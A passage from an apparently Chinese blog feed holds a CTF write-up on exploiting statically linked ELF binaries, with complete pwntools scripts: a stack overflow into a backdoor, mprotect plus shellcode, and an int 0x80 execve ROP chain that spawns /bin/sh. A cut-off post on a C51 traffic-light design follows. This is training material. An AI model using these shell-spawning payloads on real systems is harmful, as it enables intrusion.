        <content type="html"><![CDATA[<h1 id="静态链接程序利用"><a href="#静态链接程序利用" class="headerlink" title="静态链接程序利用"></a>静态链接程序利用</h1><p>一般情况下，静态链接的程序很少出现，但是也有一些。这类 elf 的漏洞利用，主要还是依靠程序本身和用户输入。</p><p>程序本身的利用就是预留的后门函数（system）和字符串（/bin/sh）。如果有这些预留，题目难度应该不大，只要设法控制程序流到后门上。</p><p>如果没有预留的后门，很有可能是需要依靠用户输入内容结合程序本身 gadget 去构造调用，也就是手工构造 onegadget 。</p><p>正常情况下，我们会去 libc 里面找利用的函数和字符串，例如：system。但 静态链接不会到 libc 找函数，静态链接程序运行时要用到的全部东西都已经包含在 ELF 文件里，所以攻击者能利用的只有 ELF 文件的东西。ret2libc 等等攻击方法就与静态链接程序无缘。</p><h2 id="实验一：get-started-3dsctf-2016"><a href="#实验一：get-started-3dsctf-2016" class="headerlink" title="实验一：get_started_3dsctf_2016"></a>实验一：get_started_3dsctf_2016</h2><p>这是一条 32 位静态链接的栈溢出题目，题目在 BUU 上有实验环境。本地和远程是采用两种解决方法。</p><p>本地就是可以利用预留的后门解决，远程利用需要结合 ELF 里的一个函数——mprotect 和 用户输入内容。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><h4 id="保护情况"><a href="#保护情况" class="headerlink" title="保护情况"></a>保护情况</h4><p>32 位只开启了 NX </p><pre><code>Arch:     i386-32-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x8048000)</code></pre><h4 id="编译情况"><a href="#编译情况" class="headerlink" title="编译情况"></a>编译情况</h4><p>这是一条静态链接的题，也就是用不到 libc 。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> file get_started_3dsctf_2016</span> </span><br><span class="line">get_started_3dsctf_2016: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, not stripped</span><br></pre></td></tr></table></figure><h4 id="漏洞函数"><a href="#漏洞函数" class="headerlink" title="漏洞函数"></a>漏洞函数</h4><p>main 函数里面调用了 gets 进行读取，没有对长度限制，可造成栈溢出：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+4h] [ebp-38h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Qual a palavrinha magica? &quot;</span>, v4);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目预留了后门函数 get_flag ，有两个判断传参的时候传进去就行了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">get_flag</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v4; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v6; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">0x308CD64F</span> &amp;&amp; a2 == <span class="number">0x195719D1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rt&quot;</span>);</span><br><span class="line">    v3 = v2;</span><br><span class="line">    v4 = getc(v2);</span><br><span class="line">    <span class="keyword">if</span> ( v4 != <span class="number">0xFF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = (<span class="keyword">char</span>)v4;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">putchar</span>(v5);</span><br><span class="line">        v6 = getc(v3);</span><br><span class="line">        v5 = (<span class="keyword">char</span>)v6;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v6 != <span class="number">255</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(v3);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到这里的基本思路是：栈溢出控制 eip 跳转后门，也就得到了[仅栈溢出的 exp](# 仅栈溢出)，远程无法 getshell 。</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>前面分析说了嘛，无法通过栈溢出跳转后门。转换一下思路，溢出空间不限。将 shellcode 写到非栈上的地方，然后用 mprotect 给内存段加上一个执行权限，在控制程序流跳转到上面。</p><p>mprotect 参数如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int mprotect(void *addr, size_t len, int prot);</span><br><span class="line">addr 内存启始地址</span><br><span class="line">len  修改内存的长度</span><br><span class="line">prot 内存的权限</span><br></pre></td></tr></table></figure><p>prot 的值为 7（rwx），重点是赋予权限的地址，要找一个有读写权限的地址，然后再给予执行权限。这里 ida 查出来的内存段权限与实际有出入，ida 里面 bss 段是有读写权限的：</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-06-05-nNNhQnmDUVUlp9fx.png"></p><p>实际试了一下，报错修改不了。然后用 gdb 查看（指令：maintenance info sections）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> maintenance info sections</span></span><br><span class="line">Exec file:</span><br><span class="line">    `/home/skye/buu/get_started_3dsctf_2016/get_started_3dsctf_2016&#x27;, file type elf32-i386.</span><br><span class="line"> [0]     0x80480f4-&gt;0x8048114 at 0x000000f4: .note.ABI-tag ALLOC LOAD READONLY DATA HAS_CONTENTS</span><br><span class="line"> [1]     0x8048114-&gt;0x804818c at 0x00000114: .rel.plt ALLOC LOAD READONLY DATA HAS_CONTENTS</span><br><span class="line"> [2]     0x804818c-&gt;0x80481af at 0x0000018c: .init ALLOC LOAD READONLY CODE HAS_CONTENTS</span><br><span class="line">……</span><br><span class="line"> [21]     0x80eb000-&gt;0x80eb048 at 0x000a2000: .got.plt ALLOC LOAD DATA HAS_CONTENTS</span><br><span class="line"> [22]     0x80eb060-&gt;0x80ebf80 at 0x000a2060: .data ALLOC LOAD DATA HAS_CONTENTS</span><br><span class="line"> [23]     0x80ebf80-&gt;0x80ecd8c at 0x000a2f80: .bss ALLOC</span><br><span class="line">……</span><br></pre></td></tr></table></figure><p>最后选定的将 shellcode 存放在 .got.plt 。所以需要构造出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">int mprotect(.got.plt地址, 够放shellcode的大小, 7);</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload += p32(mprotect_addr) + p32(got_plt) + p32(<span class="number">0x200</span>) + p32(<span class="number">0x7</span>)</span><br></pre></td></tr></table></figure><p>然后就是就是构造 read 输入 shellcode 到 .got.plt 上面，接着跳转到 .got.plt 即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload += p32(read_addr) + p32(got_plt) + p32(<span class="number">0</span>) + p32(got_plt) + p32(<span class="number">0x200</span>)</span><br></pre></td></tr></table></figure><p>实际运行后会卡在 read 函数，通过调试对比正常 read 函数，是几个寄存器的问题。在 mprotect 运行完之后，需要 pop 存放 3 个参数的寄存器，用 ROPgadget 找就行了。</p><p>read 也有 3 个参数，但是实际测试不需要 popgadget 处理，直接可以跳转就省略。</p><p>整体 payload 构造：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span></span><br><span class="line">payload += p32(mprotect_addr) + p32(pop3_ret) + p32(got_plt) + p32(<span class="number">0x200</span>) + p32(<span class="number">0x7</span>)</span><br><span class="line">payload += p32(read_addr) + p32(got_plt) + p32(<span class="number">0</span>) + p32(got_plt) + p32(<span class="number">0x200</span>)</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><h4 id="仅栈溢出"><a href="#仅栈溢出" class="headerlink" title="仅栈溢出"></a>仅栈溢出</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./get_started_3dsctf_2016&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node3.buuoj.cn&quot;,26536)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./get_started_3dsctf_2016&quot;</span>)</span><br><span class="line"></span><br><span class="line">get_flag = elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span><span class="comment"># + &#x27;b&#x27;*0x4</span></span><br><span class="line">payload += p32(get_flag)+p32(<span class="number">0xdeadbeef</span>)+p32(<span class="number">0x308CD64F</span>)+p32(<span class="number">0x195719D1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvuntil(&quot;Qual&quot;)</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="栈溢出-mprotect"><a href="#栈溢出-mprotect" class="headerlink" title="栈溢出+mprotect"></a>栈溢出+mprotect</h4><p>这里获取静态程序的函数地址和动态链接的有区别：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(<span class="string">&quot;./get_started_3dsctf_2016&quot;</span>)</span><br><span class="line"><span class="comment"># 若是动态链接</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"><span class="comment"># 若是静态链接</span></span><br><span class="line">puts_plt = elf.sym[<span class="string">&#x27;read&#x27;</span>]<span class="comment"># 方法一</span></span><br><span class="line">puts_plt = elf.symbols[<span class="string">&#x27;read&#x27;</span>]<span class="comment"># 方法二</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./get_started_3dsctf_2016&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node3.buuoj.cn&quot;,28471)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./get_started_3dsctf_2016&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop3_ret = <span class="number">0x804951D</span></span><br><span class="line">shellcode = asm(shellcraft.sh(),arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>) </span><br><span class="line"></span><br><span class="line">mprotect_addr = elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">read_addr = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">got_plt = <span class="number">0x80EB000</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span></span><br><span class="line">payload += p32(mprotect_addr) + p32(pop3_ret) + p32(got_plt) + p32(<span class="number">0x200</span>) + p32(<span class="number">0x7</span>)</span><br><span class="line">payload += p32(read_addr) + p32(got_plt) + p32(<span class="number">0</span>) + p32(got_plt) + p32(<span class="number">0x200</span>)</span><br><span class="line"><span class="comment">#payload += p32(got_plt)</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="实验二：2017-湖湘杯-pwn300"><a href="#实验二：2017-湖湘杯-pwn300" class="headerlink" title="实验二：2017 湖湘杯 pwn300"></a>实验二：2017 湖湘杯 pwn300</h2><p>32 位静态链接题目，需要结合用户输入的内容，然后调用 ELF 自身的 gadget 构建系统调用。</p><h2 id="实验三：cmcc-simplerop"><a href="#实验三：cmcc-simplerop" class="headerlink" title="实验三：cmcc_simplerop"></a>实验三：cmcc_simplerop</h2><p><strong>考点：静态链接、系统调用号、栈溢出</strong></p><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><h4 id="保护情况-1"><a href="#保护情况-1" class="headerlink" title="保护情况"></a>保护情况</h4><p>32 位程序，NX 保护</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><h4 id="漏洞函数-1"><a href="#漏洞函数-1" class="headerlink" title="漏洞函数"></a>漏洞函数</h4><p>main 中溢出，溢出长度挺大的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ROP is easy is&#x27;nt it ?&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your input :&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;v4, <span class="number">0x64</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>之前遇到 get_started_3dsctf_2016 的时候情况与这条题目看上去类似，用的是 mprotect  给内存添加执行权限，然后写入 shellcode 。实际操作一下这条题目，bss 、 got.plt 两个段修改不成功，最后看大佬 wp 知道用 系统调用号 。之前也做过一条题目也是用系统调用号，可以套用那个思路。</p><blockquote><p>什么是系统调用？<a href="https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8">维基百科</a></p><p>系统调用号有哪些？<a href="https://blog.csdn.net/xiaominthere/article/details/17287965">Linux系统调用 int 80h int 0x80</a></p></blockquote><p>就是我们最后执行这条命令：<code>int80(11,&quot;/bin/sh&quot;,null,null)</code>。系统调用参数是读取寄存器中的（对这不是32位系统的栈传参）。</p><p>四个参数对应寄存器是：eax、ebx、ecx、edx</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = p32(pop_eax) + p32(<span class="number">0xb</span>)<span class="comment">#系统调用号</span></span><br><span class="line">payload += p32(pop_edx_ecx_ebx) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(binsh_addr)</span><br><span class="line">payload += p32(int_80)</span><br></pre></td></tr></table></figure><p>程序中没有找到 /bin/sh\x00 字符串，所以还需要构建调用 read 函数写入字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span> + p32(read_addr) + p32(pop_edx_ecx_ebx) + p32(<span class="number">0</span>) + p32(binsh_addr) + p32(<span class="number">0x8</span>)</span><br></pre></td></tr></table></figure><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29604</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./simplerop&quot;)</span></span><br><span class="line"></span><br><span class="line">int_80 = <span class="number">0x80493e1</span></span><br><span class="line">pop_eax = <span class="number">0x80bae06</span></span><br><span class="line">read_addr = <span class="number">0x0806CD50</span></span><br><span class="line">binsh_addr = <span class="number">0x080EB584</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x0806e850</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span> + p32(read_addr) + p32(pop_edx_ecx_ebx) + p32(<span class="number">0</span>) + p32(binsh_addr) + p32(<span class="number">0x8</span>)</span><br><span class="line">payload += p32(pop_eax) + p32(<span class="number">0xb</span>)<span class="comment">#系统调用号</span></span><br><span class="line">payload += p32(pop_edx_ecx_ebx) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(binsh_addr)</span><br><span class="line">payload += p32(int_80)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 静态链接 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于 C51 芯片单片机简易交通灯设计</title>
      <link href="archives/9f7dfd3e/"/>
      <url>archives/9f7dfd3e/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>单片机期末课程设计搞了一个最简单的交通灯，大概记录一下。</p><h2 id="概要设计"><a href="#概要设计" class="headerlink" title="概要设计"></a>概要设计</h2><p><img src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200701215911.png" alt="交通灯系统设计"></p><h2 id="详细设计"><a href="#详细设计" class="headerlink" title="详细设计"></a>详细设计</h2><h3 id="初始化定时器-amp-外部中断"><a href="#初始化定时器-amp-外部中断" class="headerlink" title="初始化定时器&amp;外部中断"></a>初始化定时器&amp;外部中断</h3><ol><li><p><code>TMOD=0X11</code> 定时器模式 1 ，组成一个 16 位的定时器</p></li><li><p>晶振频率为 11.0592M 时，定时 50ms 的初值为 0x4c、0x00 ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TH1=<span class="number">0x4C</span>;<span class="comment">//TH1重赋初值;11.0592m晶振50ms</span></span><br><span class="line">TL1=<span class="number">0X00</span>;</span><br><span class="line">TH0=<span class="number">0x4C</span>;<span class="comment">//TH0重赋初值;11.0592m晶振50ms</span></span><br><span class="line">TL0=<span class="number">0X00</span>;</span><br></pre></td></tr></table></figure></li><li><p>启动定时0、定时1：<code>TCON=0X50</code> </p></li><li><p>开总中断;定时器1中断开启;开外部中断1;定时器0中断开启;开外部中断：<code>IE=0x8F</code> </p></li><li><p>初始化信号灯开关、时间：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">P2=<span class="number">0Xc3</span>;<span class="comment">//开始默认状态，东西绿灯，南北黄灯</span></span><br><span class="line">sec_nb=<span class="number">35</span>;<span class="comment">//南北方向初始时间</span></span><br><span class="line">sec_dx=<span class="number">30</span>;</span><br></pre></td></tr></table></figure></li></ol><h3 id="程序主循环"><a href="#程序主循环" class="headerlink" title="程序主循环"></a>程序主循环</h3><p>倒计时处理部分放在定时器中断服务中，buf 中的数字会不断刷新，主函数只需循环调用显示函数，显示倒计时。除此之外还判断是否进入特殊模式，特殊模式标志位是由外部中断修改：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    init();<span class="comment">//初始化定时器、中断服务</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(flag_option!=<span class="number">0</span>)function(); <span class="comment">//调用功能函数</span></span><br><span class="line">        display(); <span class="comment">//调用显示函数</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="信号灯计时"><a href="#信号灯计时" class="headerlink" title="信号灯计时"></a>信号灯计时</h3><p>使用定时器中断0循环计数 20 次记为 1 秒，当计数等于 20 时，进入处理倒计时数字处理逻辑部分。进入后首先重置计数器，然后各个方向时间 -1 ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(countt0==<span class="number">20</span>)                  <span class="comment">//定时器中断次数=20时（即1秒时）</span></span><br><span class="line">&#123;</span><br><span class="line">    countt0=<span class="number">0</span>;<span class="comment">//清零计数器</span></span><br><span class="line">    sec_dx--;<span class="comment">//东西时间减1</span></span><br><span class="line">    sec_nb--;<span class="comment">//南北时间减1 </span></span><br></pre></td></tr></table></figure><p>时间 -1 后需要进一步判断是否需要切换状态。需要处理的有两种：</p><ol><li>黄灯频闪：非通行方向时间剩余 5 秒，通行方向时间剩余 0 秒</li><li>切换通行方向：通行方向时间剩余 0 秒，非通行方向时间剩余 0 秒，且已经在黄灯频闪状态</li></ol><h3 id="黄灯频闪"><a href="#黄灯频闪" class="headerlink" title="黄灯频闪"></a>黄灯频闪</h3><p>进入条件：<strong>任意一个方向时间剩余 5 秒且另外一个方向时间剩余 0 秒，黄灯闪烁标志为 0 。</strong></p><p>处理方法是将通行方向增加 5 秒用于黄灯频闪：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(sec_nb==<span class="number">0</span>&amp;&amp;sec_dx==<span class="number">5</span>&amp;&amp;(Yellow_status==<span class="number">0</span>))<span class="comment">//当南北倒计时到0时，重置5秒，用于黄灯闪烁时间</span></span><br><span class="line">&#123;</span><br><span class="line">    sec_nb=<span class="number">5</span>;</span><br><span class="line">    Yellow_status=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入黄灯闪烁模式后，判断通行方向，关闭通行方向绿灯、取反黄灯状态。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>((sec_dx&lt;=<span class="number">5</span>)&amp;&amp;(dx_nb==<span class="number">1</span>)&amp;&amp;(Yellow_status==<span class="number">1</span>))  <span class="comment">//南北黄灯闪</span></span><br><span class="line">&#123;</span><br><span class="line">    Green_nb=<span class="number">0</span>;</span><br><span class="line">    Yellow_nb=~Yellow_nb;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外一个方向的处理逻辑一致。</p><h3 id="切换通行方向"><a href="#切换通行方向" class="headerlink" title="切换通行方向"></a>切换通行方向</h3><p>进入条件：当非通行方向黄灯时间、通行方向倒计时到0时</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(dx_nb==<span class="number">1</span>&amp;&amp;sec_dx==<span class="number">0</span>&amp;&amp;sec_nb==<span class="number">0</span>)            <span class="comment">//南北通行：当黄灯时间、通行方向倒计时到0时</span></span><br><span class="line">        &#123;</span><br><span class="line">            P2=<span class="number">0X00</span>;<span class="comment">//重置东西南北的红绿灯状态</span></span><br><span class="line">            Green_dx=<span class="number">1</span>;<span class="comment">//东西绿灯亮</span></span><br><span class="line">            Red_nb=<span class="number">1</span>;<span class="comment">//南北红灯亮</span></span><br><span class="line">            dx_nb=!dx_nb;<span class="comment">//交换通行方向</span></span><br><span class="line">            Yellow_status=<span class="number">0</span>;<span class="comment">//关闭黄灯闪烁</span></span><br><span class="line">            sec_dx=set_timedx;<span class="comment">//重赋东西方向的起始值</span></span><br><span class="line">            sec_nb=set_timenb+<span class="number">5</span>;<span class="comment">//重赋南北方向的起始值</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="功能函数"><a href="#功能函数" class="headerlink" title="功能函数"></a>功能函数</h3><h4 id="紧急模式"><a href="#紧急模式" class="headerlink" title="紧急模式"></a>紧急模式</h4><blockquote><p>全部方向红灯</p></blockquote><p>用外部中断0改变全局标志位来进入函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> 